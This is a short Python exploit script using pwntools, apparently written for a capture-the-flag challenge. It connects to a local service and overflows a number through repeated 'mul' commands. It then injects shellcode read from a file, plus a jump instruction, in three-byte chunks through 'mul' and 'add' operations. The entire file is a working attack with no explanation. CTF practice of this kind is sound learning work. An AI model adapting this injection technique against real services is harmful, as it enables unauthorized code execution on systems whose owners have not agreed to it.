from pwn import *
 
p = remote('127.0.0.1', 5000) 
# p = remote('127.0.0.1','9999')

def line():
    print(p.recvline().decode())
    


line()
line()
line()
print('yeet')
# make the big ahh number
for i in range(0,561):
    print(f'sending mul no {i}')
    p.sendline(b'mul ')
    p.sendline(bytes.fromhex('ffffffff'))
    # line()
    # line()


# # now read the shellcode and the jmp instruction
shellcode = open('exploit.bin', 'rb').read()
jmp_instruction = bytes.fromhex('0000000c000009380000000000000000')

payload = shellcode+jmp_instruction+jmp_instruction
chunks = [payload[i*3:(i+1)*3] for i in range((len(payload)+2)//3)]

# now we loop through each chunk, and for each chunk in the lsit of chunks we bitshift left by 3 bytes and add 3 bytes
for chunk in chunks:
    p.sendline(b'mul ')
    p.sendline(bytes.fromhex('01000000'))
    # line()
    # line()
    p.sendline(b'add ')
    p.sendline(b'\x00'+chunk)
    
    
p.sendline(b'done')

line()
line()
line()
line()
line()
line()
line()
line()
line()
line()
line()
line()
line()
line()
line()
line()
line()
line()
line()
line()
line()